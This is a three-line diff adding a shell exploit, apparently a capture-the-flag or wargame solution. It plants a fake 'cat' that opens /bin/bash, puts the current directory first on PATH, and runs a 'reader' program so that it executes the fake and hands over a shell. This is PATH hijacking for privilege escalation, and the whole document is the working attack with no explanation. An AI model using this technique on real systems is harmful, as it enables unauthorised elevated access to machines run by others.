@@ -1,0 +1,3 @@
+echo -en '#!/usr/bin/env sh\n/bin/bash\n' > cat
+chmod +x cat
+PATH=.:$PATH ./reader 01.txt
